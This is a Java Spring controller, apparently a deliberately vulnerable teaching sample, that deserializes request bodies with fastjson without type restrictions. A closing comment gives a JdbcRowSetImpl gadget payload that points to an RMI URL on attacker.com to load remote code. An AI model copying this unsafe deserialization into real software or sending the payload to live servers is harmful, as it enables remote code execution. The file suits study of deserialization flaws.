import java.io.*;
import java.util.*;
import java.util.function.*;
import com.alibaba.fastjson.JSONObject;
import org.springframework.web.bind.annotation.*;

@RestController
public class MLModelController {
    
    @PostMapping("/loadModel")
    public String loadModel(@RequestBody String modelJson) {
        try {
            // 模拟函数式处理流程
            Function<String, MLModel> deserializer = json -> {
                // 不安全的反序列化操作：未指定类型且未启用安全模式
                return JSONObject.parseObject(json, MLModel.class);
            };
            
            MLModel model = deserializer.apply(modelJson);
            return "Model loaded successfully: " + model.getName();
            
        } catch (Exception e) {
            return "Error loading model: " + e.getMessage();
        }
    }
    
    // 模拟机器学习模型类
    public static class MLModel implements Serializable {
        private String name;
        private Map<String, Object> hyperParams;
        
        // 模拟模型执行函数
        public void train() {
            System.out.println("Training " + name + " with params: " + hyperParams);
        }
        
        // Getters/Setters
        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
        public Map<String, Object> getHyperParams() { return hyperParams; }
        public void setHyperParams(Map<String, Object> hyperParams) { this.hyperParams = hyperParams; }
    }
    
    // 模拟Spring Boot启动类
    public static void main(String[] args) {
        // 实际Spring Boot应用会自动配置，此处仅模拟启动
        System.out.println("ML Model Service Started on port 8080");
    }
}

// 攻击载荷示例（实际攻击者会通过HTTP请求发送）:
// {
//   "@type":"com.sun.rowset.JdbcRowSetImpl",
//   "dataSourceName":"rmi://attacker.com:1099/Exploit",
//   "autoCommit":true
// }